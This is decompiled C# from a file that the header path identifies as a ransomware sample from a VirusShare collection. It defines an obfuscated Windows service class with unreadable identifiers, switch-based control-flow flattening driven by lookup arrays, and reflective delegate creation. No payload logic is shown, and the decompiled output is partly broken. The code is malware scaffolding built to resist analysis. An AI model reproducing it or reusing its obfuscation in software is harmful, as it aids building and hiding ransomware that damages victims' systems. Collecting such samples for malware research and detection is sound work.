// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႷႰ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႷႰ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴃ = new ႤႳ.Ⴄ();

    public ႷႰ() => this.Ⴄ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    [SpecialName]
    internal static ႳႷ.ႣႭ Ⴀ() => ႣႼ.Ⴗ;

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      byte[] ⴍ = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 5:
            goto label_4;
          case 2:
          case 4:
            goto label_5;
          case 6:
            num = this.Ⴃ.Ⴄ == null ? (int) ⴗ[28] - 48433 : (int) ⴍ[145] - 177;
            continue;
          default:
            num = !obj0 ? (int) ⴐ[401] - (int) ⴐ[519] : 6;
            continue;
        }
      }
label_4:
      this.Ⴃ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴄ()
    {
      this.Ⴃ.Ⴄ = (object) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႭႳ), 4L, 6, 1951761820), (short) 369, 'ę');
    }

    static ႷႰ() => ႳႣ.Ⴅ();

    internal static Delegate Ⴍ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
      [In] \u0021\u00212 obj0,
      [In] \u0021\u00211 obj1,
      [In] \u0021\u00210 obj2,
      [In] int obj3,
      [In] short obj4)
      where \u0021\u00210 : string
      where \u0021\u00211 : Type
      where \u0021\u00212 : Type
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = 0;
      ICloneable cloneable;
      while (true)
      {
        switch (num2)
        {
          case 0:
            int num3;
            switch ((obj3 ^ (int) obj4) - 25 ^ num1)
            {
              case 0:
                num3 = (int) ⴍ[121];
                break;
              default:
                num3 = (int) ⴗ[101] - 19659;
                break;
            }
            num2 = num3;
            continue;
          case 1:
            num2 = 0;
            continue;
          case 2:
          case 8:
            num2 = 0;
            continue;
          case 3:
            goto label_3;
          case 4:
            ++num1;
            goto case 5;
          case 5:
            int num4;
            if (3160 <= 632 - 233 * 5)
              num4 = (int) ⴐ[56];
            else
              goto label_14;
label_13:
            num2 = num4;
            continue;
label_14:
            int num5 = (int) ⴗ[40];
            ႣႣ.Ⴍ[177] = (byte) ((int) ႣႣ.Ⴍ[177] & (int) ႷႼ.Ⴗ[80] & 43);
            num4 = num5 - 15884;
            goto label_13;
          case 6:
            cloneable = (ICloneable) null;
            num2 = 4;
            continue;
          case 9:
          case 10:
            goto label_16;
          case 11:
            cloneable = (ICloneable) Delegate.CreateDelegate((Type) obj0, (Type) obj1, (string) obj2);
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴍ);
            num2 = 3;
            continue;
        }
      }
label_16:
      return (Delegate) cloneable;
    }
  }
}
